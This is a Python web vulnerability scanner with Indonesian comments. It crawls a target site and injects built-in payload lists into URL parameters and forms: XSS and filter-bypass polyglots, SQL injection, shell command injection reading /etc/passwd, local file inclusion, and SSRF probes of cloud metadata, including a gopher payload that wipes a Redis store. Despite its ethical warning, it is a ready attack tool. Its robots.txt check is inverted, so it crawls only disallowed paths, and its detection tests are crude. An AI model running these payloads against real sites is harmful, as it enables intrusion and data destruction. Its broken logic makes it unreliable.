#!/usr/bin/env python3
# BugSentinel Upgraded - Smart Web Vulnerability Scanner (2025 Edition)
import requests
import re
import sys
import time
import threading
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, parse_qsl
from urllib.robotparser import RobotFileParser
from bs4 import BeautifulSoup
from colorama import init, Fore
init(autoreset=True)

# Ethical Warning
print(Fore.MAGENTA + "[!] PERINGATAN: Gunakan tool ini HANYA pada target yang Anda MILIKI atau punya IZIN eksplisit. Scanning tanpa izin adalah ilegal!")

# Expanded Payloads (dari sumber terpercaya seperti PayloadsAllTheThings)
PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<IFRAME SRC=javascript:alert(1)></IFRAME>",
        # Polyglot untuk bypass filter
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e"
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1#",
        "1' WAITFOR DELAY '0:0:10'--",  # Time-based blind
        "' UNION SELECT NULL,NULL--",
        "admin'--",
        "\" OR 1=1--"
    ],
    "rce": [
        "; id",
        "&& whoami",
        "| ls",
        "; cat /etc/passwd",
        "$(whoami)",
        "`id`"
    ],
    "lfi": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php"
    ],
    "ssrf": [
        "http://127.0.0.1:22",
        "http://localhost:80",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_*3%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$8%0d%0a..."
    ]
}

CUSTOM_PAYLOADS = []
vulnerabilities = []
lock = threading.Lock()
visited_urls = set()

def load_custom_payloads(file):
    try:
        with open(file, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Loaded {len(lines)} custom payloads.")
            return lines
    except Exception as e:
        print(Fore.RED + f"[!] Failed to load payloads: {e}")
        return []

def obey_robots(base_url):
    rp = RobotFileParser()
    rp.set_url(urljoin(base_url, "/robots.txt"))
    try:
        rp.read()
    except:
        return lambda u: True  # Jika gagal, allow all
    return lambda u: not rp.can_fetch("*", u)

def extract_forms(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        if name:
            inputs.append({"name": name, "type": input_tag.attrs.get("type", "text")})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def crawl(url, depth, max_depth, allow_crawl):
    if depth > max_depth or url in visited_urls or not allow_crawl(url):
        return []
    visited_urls.add(url)
    urls_found = []
    try:
        r = requests.get(url, timeout=10)
        if r.status_code != 200:
            return []
        soup = BeautifulSoup(r.text, "html.parser")
        for link in soup.find_all("a"):
            href = link.attrs.get("href")
            if href:
                full_url = urljoin(url, href)
                if urlparse(full_url).netloc == urlparse(url).netloc:
                    urls_found.append(full_url)
    except:
        pass
    return urls_found

def inject_get(url, param, payload):
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query))
    query[param] = payload
    new_query = urlencode(query)
    return parsed._replace(query=new_query).geturl()

def submit_form(form_details, url, payload_dict):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_field in form_details["inputs"]:
        data[input_field["name"]] = payload_dict.get(input_field["name"], "test")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data, timeout=10)
    else:
        return requests.get(target_url, params=data, timeout=10)

def check_vuln(response, attack_type, payload):
    text = response.text.lower()
    if attack_type == "xss" and payload.lower() in text:
        return True
    elif attack_type == "sqli":
        if re.search(r"sql|mysql|syntax|ora-|postgresql", text, re.I) or response.elapsed.total_seconds() > 8:
            return True
    elif attack_type == "rce" and re.search(r"uid=|gid=|root|www-data", text):
        return True
    elif attack_type == "lfi" and "root:x:" in text:
        return True
    elif attack_type == "ssrf" and ("root" in text or response.status_code == 500):
        return True
    return False

def scan_url(url, custom_payloads, delay):
    time.sleep(delay)
    params = dict(parse_qsl(urlparse(url).query))
    forms = []
    try:
        r = requests.get(url, timeout=10)
        forms = extract_forms(r.text)
    except:
        pass

    for attack_type, base_payloads in PAYLOADS.items():
        payloads = base_payloads + (custom_payloads if custom_payloads else [])
        print(Fore.CYAN + f"[*] Scanning {attack_type.upper()} on {url}")

        # GET params
        for param in params:
            for payload in payloads:
                test_url = inject_get(url, param, payload)
                try:
                    resp = requests.get(test_url, timeout=10)
                    if check_vuln(resp, attack_type, payload):
                        vuln = f"[VULN] {attack_type.upper()} in GET param '{param}' → {test_url}"
                        print(Fore.RED + vuln)
                        with lock:
                            vulnerabilities.append(vuln)
                except:
                    pass

        # POST forms
        for form in forms:
            form_details = get_form_details(form)
            for payload in payloads:
                payload_dict = {inp["name"]: payload for inp in form_details["inputs"] if inp["type"] != "submit"}
                if not payload_dict:
                    continue
                try:
                    resp = submit_form(form_details, url, payload_dict)
                    if check_vuln(resp, attack_type, payload):
                        vuln = f"[VULN] {attack_type.upper()} in POST form → {url}"
                        print(Fore.RED + vuln)
                        with lock:
                            vulnerabilities.append(vuln)
                except:
                    pass

# Fungsi lain tetap (headers, sensitive files, dll.) - saya singkat di sini untuk fokus upgrade utama
# Kamu bisa copy-paste dari kode lama dan panggil di main.

def main():
    if len(sys.argv) < 3 or "-u" not in sys.argv:
        print("Usage: python3 bugsentinel_upgraded.py -u https://target.com/?id=1 [--depth 3] [--delay 1] [-l payloads.txt]")
        sys.exit(1)

    url_idx = sys.argv.index("-u") + 1
    target_url = sys.argv[url_idx]
    depth = int(sys.argv[sys.argv.index("--depth") + 1]) if "--depth" in sys.argv else 2
    delay = float(sys.argv[sys.argv.index("--delay") + 1]) if "--delay" in sys.argv else 1.0

    base = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}/"
    allow_crawl = obey_robots(base)

    custom = []
    if "-l" in sys.argv:
        custom = load_custom_payloads(sys.argv[sys.argv.index("-l") + 1])

    print(Fore.YELLOW + f"\n[+] Starting scan on: {target_url} (crawl depth: {depth})")

    # Crawl untuk kumpul URLs
    to_scan = [target_url]
    for d in range(depth):
        new_urls = []
        for u in to_scan:
            new_urls += crawl(u, d, depth, allow_crawl)
        to_scan += list(set(new_urls) - visited_urls)

    # Scan paralel sederhana
    threads = []
    for u in set(to_scan):
        t = threading.Thread(target=scan_url, args=(u, custom, delay))
        threads.append(t)
        t.start()
        if len(threads) >= 10:  # Max 10 threads
            for tt in threads:
                tt.join()
            threads = []

    for t in threads:
        t.join()

    # Scan lain (headers, sensitive files, dll.) pada base
    # fingerprint_server(base), scan_headers(base), dll.

    print(Fore.MAGENTA + "\n=== SCAN SELESAI ===")
    print(Fore.RED + f"Total Vulnerabilities Found: {len(vulnerabilities)}")
    for v in vulnerabilities:
        print(v)

if __name__ == "__main__":
    main()
